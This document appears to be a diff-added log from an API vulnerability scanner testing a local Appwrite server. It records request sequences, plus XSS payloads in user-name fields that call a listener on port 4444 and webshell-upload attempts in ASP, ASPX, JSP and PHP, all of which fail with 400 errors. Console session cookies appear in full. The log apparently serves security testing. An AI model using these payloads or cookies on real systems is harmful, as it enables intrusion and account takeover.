+send request: post http://192.168.1.118/v1/teams
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {}
+request_data: {'name': 'VoAPITestString11', 'roles': ['VoAPITestString33']}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+##############
+candidate_api_seq: [<VoAPITemplate.ApiTemplate object at 0x7f395774f2b0>, <VoAPITemplate.ApiTemplate object at 0x7f39580cd6d0>, <VoAPITemplate.ApiTemplate object at 0x7f39575b2a60>, <VoAPITemplate.ApiTemplate object at 0x7f3957f2e520>, <VoAPITemplate.ApiTemplate object at 0x7f3957f2e400>]
+/teams Post
+/teams/{teamId} Put
+/teams/{teamId}/memberships Post
+/teams/{teamId}/memberships/{membershipId} Patch
+/teams/{teamId}/memberships/{membershipId}/status Patch
+candidate_api_seq_relations: ---------------
+producer_api: /teams/{teamId}/memberships/{membershipId} Patch
+producer_param: teamId
+consumer_api: /teams/{teamId}/memberships/{membershipId}/status Patch
+consumer_param: teamId
+------------
+producer_api: /teams/{teamId}/memberships/{membershipId} Patch
+producer_param: $id
+consumer_api: /teams/{teamId}/memberships/{membershipId}/status Patch
+consumer_param: membershipId
+------------
+producer_api: /teams/{teamId}/memberships/{membershipId} Patch
+producer_param: userId
+consumer_api: /teams/{teamId}/memberships/{membershipId}/status Patch
+consumer_param: userId
+------------
+producer_api: /teams/{teamId}/memberships Post
+producer_param: teamId
+consumer_api: /teams/{teamId}/memberships/{membershipId} Patch
+consumer_param: teamId
+------------
+producer_api: /teams/{teamId}/memberships Post
+producer_param: $id
+consumer_api: /teams/{teamId}/memberships/{membershipId} Patch
+consumer_param: membershipId
+------------
+producer_api: /teams/{teamId} Put
+producer_param: $id
+consumer_api: /teams/{teamId}/memberships Post
+consumer_param: teamId
+------------
+producer_api: /teams/{teamId} Put
+producer_param: name
+consumer_api: /teams/{teamId}/memberships Post
+consumer_param: name
+------------
+producer_api: /teams Post
+producer_param: $id
+consumer_api: /teams/{teamId} Put
+consumer_param: teamId
+------------
+producer_api: /teams Post
+producer_param: name
+consumer_api: /teams/{teamId} Put
+consumer_param: name
+------------
+candidate_api_test_types: {'command_api': ['secret', 'userId'], 'database_api': ['userId']}
+----------------Send: -----------------------
+send request: post http://192.168.1.118/v1/teams
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {}
+request_data: {'name': 'VoAPITestString28', 'roles': ['VoAPITestString30']}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+##############
+candidate_api_seq: [<VoAPITemplate.ApiTemplate object at 0x7f3957ffd370>]
+/users Post
+candidate_api_seq_relations: ---------------
+candidate_api_test_types: {'display_api': ['name']}
+----------------Send: -----------------------
+send request: post http://192.168.1.118/v1/users
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {}
+request_data: {'email': 'dvcsyqwr@blvqbpmyx.com', 'name': "<img src='http://192.168.1.118:4444/xss/usersVoAPIname'>", 'password': ',/*SbIr_?rzD`S'}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+----------------Send: -----------------------
+send request: post http://192.168.1.118/v1/users
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {}
+request_data: {'email': 'qiypuakaft@qsra.org', 'name': "<img src='https://192.168.1.118:4445/xss/usersVoAPIname'>", 'password': "%4}\\G'2ECj(~R+"}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+----------------Send: -----------------------
+send request: post http://192.168.1.118/v1/users
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {}
+request_data: {'email': 'wjmlzpx@iquaqrmain.org', 'name': "<script>window.location='http://192.168.1.118:4444/xss/usersVoAPIname'</script>", 'password': '?mWb,ijcQx7A5r'}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+##############
+candidate_api_seq: [<VoAPITemplate.ApiTemplate object at 0x7f39572f3eb0>]
+/storage/files Post
+candidate_api_seq_relations: ---------------
+candidate_api_test_types: {'upload_api': ['file']}
+----------------Send: -----------------------
+send request: post http://192.168.1.118/v1/storage/files
+api_header_dict: {'Content-Type': 'multipart/form-data; boundary=0d4f4a1c9aaaa2df7029b6e94b1088ac', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {}
+request_data: b'--0d4f4a1c9aaaa2df7029b6e94b1088ac\r\nContent-Disposition: form-data; name="file"; filename="webshell.asp"\r\nContent-Type: application/octet-stream\r\n\r\n<%\nResponse.Write("VoAPI WebShell");\n%>\r\n--0d4f4a1c9aaaa2df7029b6e94b1088ac--\r\n'
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+----------------Send: -----------------------
+send request: post http://192.168.1.118/v1/storage/files
+api_header_dict: {'Content-Type': 'multipart/form-data; boundary=50a329296bb5c52ceecddcc5b2de8c23', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {}
+request_data: b'--50a329296bb5c52ceecddcc5b2de8c23\r\nContent-Disposition: form-data; name="file"; filename="webshell.aspx"\r\nContent-Type: application/octet-stream\r\n\r\n<%@ Page Language="Jscript"%><%Response.Write("VoAPI WebShell");%>\r\n--50a329296bb5c52ceecddcc5b2de8c23--\r\n'
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+----------------Send: -----------------------
+send request: post http://192.168.1.118/v1/storage/files
+api_header_dict: {'Content-Type': 'multipart/form-data; boundary=3db7cbc543a7d6a15b0e1e5905bab784', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {}
+request_data: b'--3db7cbc543a7d6a15b0e1e5905bab784\r\nContent-Disposition: form-data; name="file"; filename="webshell.jsp"\r\nContent-Type: application/octet-stream\r\n\r\n<%out.print("VoAPI WebSehll");%>\r\n--3db7cbc543a7d6a15b0e1e5905bab784--\r\n'
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+----------------Send: -----------------------
+send request: post http://192.168.1.118/v1/storage/files
+api_header_dict: {'Content-Type': 'multipart/form-data; boundary=4a2c484d8ce3f1fe1e9e82d42409d0ac', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {}
+request_data: b'--4a2c484d8ce3f1fe1e9e82d42409d0ac\r\nContent-Disposition: form-data; name="file"; filename="webshell.php"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo "VoAPI WebShell" ?>\r\n--4a2c484d8ce3f1fe1e9e82d42409d0ac--\r\n'
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+----------------VoAPI End-----------------------
